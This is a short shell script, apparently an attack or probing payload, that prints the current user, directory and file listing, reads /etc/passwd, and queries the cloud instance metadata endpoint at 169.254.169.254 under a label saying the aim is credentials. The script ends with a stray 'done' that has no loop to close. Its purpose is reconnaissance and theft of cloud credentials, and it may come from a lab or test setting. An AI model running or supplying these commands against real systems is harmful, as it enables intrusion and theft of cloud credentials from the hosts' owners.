#!/bin/sh

echo ****whoami***
whoami
echo ****pwd****
pwd
echo ****ls****
ls
echo ****cat /etc/passwd***
cat /etc/passwd
echo ****curl metadata for creds****
curl http://169.254.169.254/latest/dynamic/
done
